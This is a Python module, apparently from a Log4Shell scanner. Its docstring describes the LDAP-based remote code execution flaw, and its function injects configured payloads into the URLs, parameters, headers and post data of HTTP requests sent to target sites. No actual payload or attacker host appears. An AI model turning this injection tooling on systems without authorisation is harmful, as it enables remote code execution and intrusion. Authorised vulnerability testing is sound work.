#!/usr/bin/env python3
"""
Log4Shell is a vulnerability disclosed in December 2021, concerning the Apache logging library Log4j.
It allowed an attacker to execute code via a logged parameter in a HTTP(S) request, such as a header, or post data.
An attacker would pass a payload through a logged parameter causing the server to access their LDAP server, and evaluate
the Java code hosted by the attacker.

To test a website for Log4Shell, it would be wise to test multiple endpoints (pages on the site), as the library
is likely to be used in multiple places. It should also be tested on multiple endpoints, both of which can be 
specified by the user in the targets.json file.
"""

import json, requests
from requests.exceptions import ConnectionError

def replace_dicts ( obj, rep_str, payload ):
    # Replaces each replace-string ('i.e. PAYLOAD') in all dict keys' values with the payload.
    for key, value in obj.items():
        value = value.replace( rep_str, payload )
        obj[key] = value
    return obj

def process (target, payload, endpoint, rep_str, proxies): 
    """
    This function constructs the request based off of the values defined in the targets file.
    """

    # Next block defines the request details
    # and replaces wherever the payload replace string ('i.e. PAYLOAD') is with the actual payload

    REQUEST_VERB = endpoint["method"]
    URL = target["uri"] + ":" + endpoint["port"] + endpoint["endpoint"]
    URL = URL.replace(rep_str, payload["payload"]) # Replace special string with payload if required 

    # Replace any request params with payload (if specified)
    PARAMS = replace_dicts( endpoint["params"], rep_str, payload["payload"])   

    # Replace any request headers with payload (if specified) 
    HEADERS = replace_dicts( endpoint["headers"], rep_str, payload["payload"])
    COOKIES = endpoint["cookies"]

    try:
        # Replace any request post data with payload (if specified)
        DATA = replace_dicts( endpoint["post"]["data"], rep_str, payload["payload"] )
    except:
        DATA = {}
    try:
        # Replace any request JSON post data with payload (if specified)
        JSON = replace_dicts( endpoint["post"]["json"], rep_str, payload["payload"] )
    except:
        JSON = {}

    

    # fill request obj with config params
    try:
        response = requests.request(
    REQUEST_VERB,                               # e.g. get, post, put, delete
    URL,                                    
    params=PARAMS,                              # get request parameters (empty dict if nonexistent)
    headers=HEADERS,                            
    cookies=COOKIES,
    json=JSON,                                  # json in request body
    data=DATA, 
    proxies=proxies
    )
    except ConnectionError:
        pass


    call = {
        "method":REQUEST_VERB,
        "url":URL,
        "proxies":proxies,
        "params":PARAMS,
        "headers":HEADERS,
        "cookies":COOKIES,
        "post-data":{
            "json":JSON,
            "data":DATA,
        },
        "status-code":response.status_code,
        "response-data":response.__dict__
    }
    return call